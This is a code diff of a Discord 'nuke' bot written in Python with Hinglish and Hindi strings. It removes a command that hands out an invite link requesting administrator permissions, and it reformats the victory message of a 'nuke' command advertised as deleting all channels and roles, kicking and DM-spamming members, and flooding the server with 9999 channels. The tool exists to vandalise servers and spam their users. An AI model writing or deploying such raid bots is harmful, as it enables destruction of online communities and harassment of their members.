@@ -28,39 +28,6 @@ async def on_ready():
     except Exception as e:
         print(f"❌ Error syncing commands: {e}")
 
-# ============ ADD COMMAND ============
-@bot.tree.command(name="add", description="🤖 Server ID daal kar bot ko add karo!")
-@discord.app_commands.describe(server_id="Target server ka ID")
-async def add(interaction: discord.Interaction, server_id: str):
-    """Server ID daalkar bot ko directly add karo"""
-    
-    CLIENT_ID = os.getenv("CLIENT_ID", "1469213868323504261")
-    
-    try:
-        invite_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot%20applications.commands"
-        
-        embed = discord.Embed(
-            title="🤖 Bot को Add करें",
-            description=f"Server ID: `{server_id}`\n\n**Bot को add करने के लिए नीचे क्लिक करें!**",
-            color=discord.Color.red()
-        )
-        embed.add_field(
-            name="⚡ Quick Add:",
-            value="बटन दबाओ → Server select करो → Authorize करो → DONE! ✅",
-            inline=False
-        )
-        
-        class AddBotView(discord.ui.View):
-            @discord.ui.button(label="⚡ Add Bot Now", style=discord.ButtonStyle.red, emoji="➕")
-            async def add_bot_button(self, inter: discord.Interaction, button: discord.ui.Button):
-                await inter.response.send_message(f"🔗 **[यहाँ क्लिक करके Bot को Add करो!]({invite_url})**", ephemeral=True)
-        
-        await interaction.response.send_message(embed=embed, view=AddBotView())
-        active_users[interaction.user.id] = datetime.now()
-        
-    except Exception as e:
-        await interaction.response.send_message(f"❌ Error: {str(e)}", ephemeral=True)
-
 # ============ ULTIMATE NUKE COMMAND ============
 @bot.tree.command(name="nuke", description="💥 COMPLETE SERVER DESTRUCTION! 9999 CHANNELS + 999 ROLES + MEMBER KICK + DM SPAM!")
 @discord.app_commands.checks.has_permissions(administrator=True)
@@ -221,24 +188,24 @@ async def nuke(interaction: discord.Interaction):
         try:
             general = await guild.create_text_channel("0-nuke-complete")
             await general.send("""
-🚀🚀🚀 **SERVER KI ULTIMATE NUKING HO GAYEE!** 🚀🚀🚀
+ 🚀🚀🚀 **SERVER KI ULTIMATE NUKING HO GAYEE!** 🚀🚀🚀
 
-╔═══════════════════════════════════════╗
-║  💥 TOTAL DESTRUCTION REPORT 💥      ║
-╠═══════════════════════════════════════╣
-║ ✅ All Channels: DELETED              ║
-║ ✅ All Roles: DELETED                 ║
-║ ✅ All Members: KICKED + DM SPAMMED   ║
-║ ✅ 9999 Chaos Channels: CREATED       ║
-║ ✅ 999 Spams per Channel: SENT        ║
-║ ✅ 999 New Roles: CREATED             ║
-║ ✅ Server Icon: CHANGED               ║
-╚═══════════════════════════════════════╝
+ ╔═══════════════════════════════════════╗
+ ║  💥 TOTAL DESTRUCTION REPORT 💥      ║
+ ╠═══════════════════════════════════════╣
+ ║ ✅ All Channels: DELETED              ║
+ ║ ✅ All Roles: DELETED                 ║
+ ║ ✅ All Members: KICKED + DM SPAMMED   ║
+ ║ ✅ 9999 Chaos Channels: CREATED       ║
+ ║ ✅ 999 Spams per Channel: SENT        ║
+ ║ ✅ 999 New Roles: CREATED             ║
+ ║ ✅ Server Icon: CHANGED               ║
+ ╚═══════════════════════════════════════╝
 
-**SERVER STATUS: 💀 COMPLETELY NUKED 💀**
+ **SERVER STATUS: 💀 COMPLETELY NUKED 💀**
 
-यह server अब हल्क हो गया है! 🎉
-""")
+ यह server अब हल्क हो गया है! 🎉
+ """)
         except:
             pass
         
